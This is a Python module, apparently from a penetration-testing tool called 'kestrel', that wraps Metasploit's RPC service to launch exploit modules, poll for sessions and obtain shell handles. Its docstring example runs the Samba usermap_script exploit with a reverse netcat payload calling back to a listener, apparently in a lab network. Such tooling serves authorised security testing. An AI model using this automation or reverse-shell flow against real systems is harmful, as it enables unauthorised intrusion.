"""Metasploit Framework RPC session (pymetasploit3).

Connects to ``msfrpcd`` running on Kali (set up by scripts/kali-setup-msfrpc.sh).
Provides programmatic exploit execution + session tracking — much more reliable
than spawning ``msfconsole -r <rc>`` and parsing text output.

Auth secret is loaded from ~/.kestrel/msfrpc.secret (mode 0600) unless overridden.

Common flow:
    msf = MSFRPCSession.from_config()
    msf.open()
    job = msf.execute_exploit(
        "exploit/multi/samba/usermap_script",
        options={"RHOSTS": "10.10.10.3", "PAYLOAD": "cmd/unix/reverse_netcat", "LHOST": "10.10.14.1", "LPORT": 4444},
    )
    # poll msf.sessions() until our session appears
    msf.close()
"""

from __future__ import annotations

import os
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from kestrel.transport.base import ExecResult, Session

DEFAULT_SECRET_PATH = Path.home() / ".kestrel" / "msfrpc.secret"


@dataclass
class MSFRPCConfig:
    """Connection parameters for msfrpcd."""

    host: str = "127.0.0.1"
    port: int = 55553
    user: str = "msf"
    password: str = ""
    ssl: bool = True

    @classmethod
    def from_secret_file(cls, secret_path: Path | str = DEFAULT_SECRET_PATH, **overrides: Any) -> "MSFRPCConfig":
        """Load password from ~/.kestrel/msfrpc.secret, env vars take precedence."""
        password = os.environ.get("KESTREL_MSF_PASSWORD", "")
        if not password:
            secret_path = Path(secret_path).expanduser()
            if secret_path.exists():
                password = secret_path.read_text(encoding="utf-8").strip()
        host = os.environ.get("KESTREL_MSF_HOST", "127.0.0.1")
        port = int(os.environ.get("KESTREL_MSF_PORT", "55553"))
        user = os.environ.get("KESTREL_MSF_USER", "msf")
        ssl_str = os.environ.get("KESTREL_MSF_SSL", "true")
        ssl = ssl_str.lower() in ("1", "true", "yes", "on")
        return cls(host=host, port=port, user=user, password=password, ssl=ssl, **overrides)


class MSFRPCSession(Session):
    """Wrapper around pymetasploit3.msfrpc.MsfRpcClient.

    Implements the Session interface for transport registry compatibility, but
    its real value is in higher-level methods: execute_exploit, sessions,
    session_shell, etc.
    """

    def __init__(self, config: MSFRPCConfig, handle_id: str | None = None) -> None:
        self.config = config
        self.handle_id = handle_id or f"msf-{uuid.uuid4().hex[:8]}"
        self._client = None

    @classmethod
    def from_config(cls, **overrides: Any) -> "MSFRPCSession":
        return cls(MSFRPCConfig.from_secret_file(**overrides))

    def open(self) -> None:
        if self._client is not None:
            return
        from pymetasploit3.msfrpc import MsfRpcClient

        self._client = MsfRpcClient(
            self.config.password,
            server=self.config.host,
            port=self.config.port,
            ssl=self.config.ssl,
            username=self.config.user,
        )

    @property
    def client(self):
        if self._client is None:
            raise RuntimeError("MSFRPCSession not opened — call .open() first")
        return self._client

    # ── Generic Session.exec ─────────────────────────────────────────────────

    def exec(self, cmd: str, timeout: float = 120.0) -> ExecResult:
        """Execute a console command via msf's interactive console.

        This is a fallback path — prefer execute_exploit() for real flows.
        """
        if self._client is None:
            self.open()
        console = self.client.consoles.console()
        started = time.monotonic()
        try:
            res = console.run_with_output(cmd, timeout=timeout)
            stdout = res if isinstance(res, str) else str(res)
            return ExecResult(
                stdout=stdout,
                stderr="",
                rc=0,
                duration_s=round(time.monotonic() - started, 3),
            )
        finally:
            console.destroy()

    def close(self) -> None:
        if self._client is not None:
            try:
                self._client.logout()
            except Exception:
                pass
            self._client = None

    # ── High-level exploit interface ─────────────────────────────────────────

    def search_modules(self, query: str) -> list[dict]:
        """Search MSF modules by keyword. Returns list of {fullname, type, name, rank}."""
        if self._client is None:
            self.open()
        return self.client.modules.search(query)

    def execute_exploit(
        self,
        module: str,
        options: dict[str, Any],
        payload: str | None = None,
        timeout: float = 60.0,
    ) -> dict[str, Any]:
        """Launch an exploit module with options and (optionally) a payload.

        Returns dict with:
            job_id (int): MSF job id of the exploit
            uuid (str): client-side uuid for tracking
            options: dict of effective module options
        """
        if self._client is None:
            self.open()
        mod = self.client.modules.use("exploit", module.replace("exploit/", "", 1))
        for k, v in options.items():
            mod[k] = v
        result: dict[str, Any] = {"options": dict(options)}
        if payload:
            payload_mod = self.client.modules.use("payload", payload.replace("payload/", "", 1))
            for k, v in options.items():
                if k in payload_mod.options:
                    payload_mod[k] = v
            result["job_id"] = mod.execute(payload=payload_mod).get("job_id")
        else:
            result["job_id"] = mod.execute().get("job_id")
        return result

    def sessions(self) -> dict[str, dict]:
        """Return active MSF sessions keyed by session id."""
        if self._client is None:
            self.open()
        return self.client.sessions.list

    def session_shell(self, session_id: int | str) -> Any:
        """Get a shell handle for an active session."""
        if self._client is None:
            self.open()
        return self.client.sessions.session(str(session_id))

    def wait_for_session(self, after_jobid: int | None = None, timeout: float = 30.0) -> str | None:
        """Poll sessions() until a new one appears (after_jobid is informational, MSF doesn't link directly).

        Returns the new session id (as string) or None on timeout.
        """
        if self._client is None:
            self.open()
        deadline = time.monotonic() + timeout
        initial = set(self.client.sessions.list.keys())
        while time.monotonic() < deadline:
            current = set(self.client.sessions.list.keys())
            new = current - initial
            if new:
                return next(iter(new))
            time.sleep(1.0)
        return None

    def ping(self) -> bool:
        """Quick health check — returns True if RPC responds, False otherwise."""
        try:
            self.open()
            _ = self.client.core.version
            return True
        except Exception:
            return False
